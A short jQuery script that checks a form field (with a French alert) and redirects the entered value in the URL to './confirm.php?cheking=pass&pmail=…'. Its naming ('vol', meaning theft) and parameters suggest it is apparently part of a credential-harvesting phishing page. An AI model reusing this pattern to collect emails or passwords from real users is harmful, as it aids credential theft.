/*global $, console, alert, prompt */
/*jslint plusplus: true, evil: true */
/*eslint no-unused-vars: "error"*/
/*eslint-env browser*/

$('.snd1').click(function() {
    'use strict';
    if ($('#put1').val().length <= 0) {
        alert("veuillez remplir le champ obligatoire");
    } else {
        var vol = $('#put1').val();
        okok(vol);



    }

});


function okok(vol) {
    'use strict';
    return window.location.href = "./confirm.php?cheking=pass&pmail=" + vol + "&id=" + Math.floor(Math.random() * 1000000) + 1;

};